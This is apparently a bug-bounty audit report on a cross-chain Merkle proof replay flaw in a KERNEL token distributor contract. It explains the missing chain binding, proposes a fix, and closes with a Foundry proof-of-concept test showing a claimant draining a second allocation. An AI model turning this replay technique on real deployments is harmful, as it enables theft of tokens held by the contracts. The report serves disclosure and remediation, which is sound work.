### Title
Cross-Chain Merkle Proof Replay Enables Double-Claiming of KERNEL Allocation â€” (`contracts/KERNEL/KernelTop100MerkleDistributor.sol`)

---

### Summary

`KernelTop100MerkleDistributor` encodes merkle leaves without any chain-specific data. If the same `merkleRoot` is deployed on two EVM chains, a legitimate claimant can replay their proof on the second chain and receive a second full allocation of KERNEL tokens.

---

### Finding Description

The leaf hash in `_verifyClaimProof` is:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(user, amount));
``` [1](#0-0) 

It encodes only `user` and `amount` â€” no `block.chainid`, no `address(this)`, no nonce. The claim-state that prevents double-spending is stored in:

```solidity
mapping(address user => UserClaim userClaim) public userClaims;
``` [2](#0-1) 

This mapping is local to each contract instance. A successful `claim()` on Chain A writes to Chain A's storage only; Chain B's storage is untouched. Because the leaf is chain-agnostic, the same `(user, amount, proof)` tuple satisfies `MerkleProofUpgradeable.verify` on every chain where the same `merkleRoot` is configured. [3](#0-2) 

The `merkleRoot` is set once at initialization and never includes chain context: [4](#0-3)

### Impact Explanation

An attacker who is a legitimate claimant executes:

1. `claim(amount, proof)` on Chain A â†’ receives up to `amount` KERNEL (minus fee) over the 30-day vesting window.
2. `claim(amount, proof)` on Chain B â†’ receives another `amount` KERNEL from Chain B's contract balance.

Total received: `N Ă— allocation` across N chains. The excess tokens are KERNEL held at-rest in the distributor contracts on the additional chains â€” **direct theft of user funds at-rest**, matching the Critical impact scope.

---

### Likelihood Explanation

- EOAs are identical across all EVM chains by construction.
- rsETH/Kernel is a multi-chain protocol; deploying the same distributor on Ethereum + an L2 with the same merkle snapshot is a natural operational choice.
- No admin compromise, no front-running, and no brute force is required â€” the attacker only needs their own valid proof.
- The exploit is fully self-service and requires no coordination.

---

### Recommendation

Bind the leaf to the chain and contract instance by including `block.chainid` and `address(this)` in the encoded leaf:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(block.chainid, address(this), user, amount));
```

This makes every proof chain- and contract-specific, so a proof valid on Chain A is cryptographically invalid on Chain B even with the same `merkleRoot`.

import "forge-std/Test.sol";
import {KernelTop100MerkleDistributor} from "contracts/KERNEL/KernelTop100MerkleDistributor.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

contract CrossChainReplayTest is Test {
    // Simulate two independent deployments (same merkleRoot, different chain contexts)
    KernelTop100MerkleDistributor distributorA;
    KernelTop100MerkleDistributor distributorB;
    MockERC20 kernel;

    address attacker = address(0xBEEF);
    uint256 allocation = 1000e18;

    function setUp() public {
        kernel = new MockERC20("KERNEL", "KERNEL");

        // Build a single-leaf merkle tree: leaf = keccak256(abi.encodePacked(attacker, allocation))
        bytes32 leaf = keccak256(abi.encodePacked(attacker, allocation));
        bytes32 root = leaf; // single-leaf tree: root == leaf

        uint256 futureStart = block.timestamp + 1;

        distributorA = new KernelTop100MerkleDistributor();
        distributorA.initialize(address(kernel), address(1), address(2), 0, futureStart, root);
        kernel.mint(address(distributorA), allocation);

        distributorB = new KernelTop100MerkleDistributor();
        distributorB.initialize(address(kernel), address(1), address(2), 0, futureStart, root);
        kernel.mint(address(distributorB), allocation);

        // Advance past vesting start and to end so full amount is claimable
        vm.warp(futureStart + 30 days);
    }

    function testCrossChainReplay() public {
        bytes32[] memory proof = new bytes32[](0); // single-leaf: empty proof

        vm.startPrank(attacker);
        distributorA.claim(allocation, proof); // claim on "chain A"
        distributorB.claim(allocation, proof); // replay on "chain B"
        vm.stopPrank();

        // Attacker received 2Ă— their allocation
        assertEq(kernel.balanceOf(attacker), 2 * allocation);
    }
}
